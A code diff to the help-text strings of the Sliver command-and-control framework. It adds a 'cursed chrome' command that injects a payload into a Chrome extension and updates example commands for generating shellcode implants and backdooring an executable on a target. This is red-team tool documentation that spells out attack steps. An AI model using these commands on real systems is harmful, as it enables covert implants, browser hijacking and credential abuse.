@@ -103,6 +103,8 @@ var (
 		consts.ReactionStr:                         reactionHelp,
 		consts.ReactionStr + sep + consts.SetStr:   reactionSetHelp,
 		consts.ReactionStr + sep + consts.UnsetStr: reactionUnsetHelp,
+
+		consts.Cursed + sep + consts.CursedChrome: cursedChromeHelp,
 	}
 
 	jobsHelp = `[[.Bold]]Command:[[.Normal]] jobs <options>
@@ -204,10 +206,10 @@ stage-listener --url tcp://1.2.3.4:8080 --profile my-sliver-profile
 
 To create a profile, use the [[.Bold]]profiles new[[.Normal]] command. A common scenario is to create a profile that generates a shellcode, which can act as a stage 2:
 
-profiles new --profile-name windows-shellcode --format shellcode --mtls 1.2.3.4 --skip-symbols
+profiles new --format shellcode --mtls 1.2.3.4 --skip-symbols windows-shellcode
 `
 
-	newProfileHelp = `[[.Bold]]Command:[[.Normal]] new [--profile-name] <options>
+	newProfileHelp = `[[.Bold]]Command:[[.Normal]] new <options> <profile name>
 [[.Bold]]About:[[.Normal]] Create a new profile with a given name and options, a name is required.
 
 [[.Bold]][[.Underline]]++ Profiles ++[[.Normal]]
@@ -462,7 +464,7 @@ The [[.Bold]]psexec[[.Normal]] command will use the credentials of the Windows u
 [[.Bold]]About:[[.Normal]] Inject a sliver shellcode into an existing file on the target system.
 [[.Bold]]Example:[[.Normal]] backdoor --profile windows-shellcode "c:\windows\system32\calc.exe"
 
-[[.Bold]]Remark:[[.Normal]] you must first create a profile that will serve as your base shellcode, with the following command: profiles new --format shellcode --profile-name whatever --http ab.cd
+[[.Bold]]Remark:[[.Normal]] you must first create a profile that will serve as your base shellcode, with the following command: profiles new --format shellcode --http ab.cd windows-shellcode
 `
 	makeTokenHelp = `[[.Bold]]Command:[[.Normal]] make-token -u USERNAME -d DOMAIN -p PASSWORD
 [[.Bold]]About:[[.Normal]] Creates a new Logon Session from the specified credentials and impersonate the resulting token.
@@ -686,6 +688,19 @@ dllhijack --reference-path c:\\windows\\system32\\msasn1.dll --reference-file /t
 
 	getPrivsHelp = `[[.Bold]]Command:[[.Normal]] getprivs
 [[.Bold]]About:[[.Normal]] Get privilege information for the current process (Windows only).
+`
+
+	cursedChromeHelp = `[[.Bold]]Command:[[.Normal]] cursed chrome
+[[.Bold]]About:[[.Normal]] Injects a Cursed Chrome payload into an existing Chrome extension.
+
+If no extension is specified, Sliver will enumerate all installed extensions, extract their
+permissions and determine a valid target for injection. For Cursed Chrome to work properly
+the target extension must have either of these two sets of permissions:
+
+1. "webRequest" "webRequestBlocking" "<all_urls>" 
+2. "webRequest" "webRequestBlocking" "http://*/*" "https://*/*" 
+
+More information: https://github.com/mandatoryprogrammer/CursedChrome
 `
 )
 
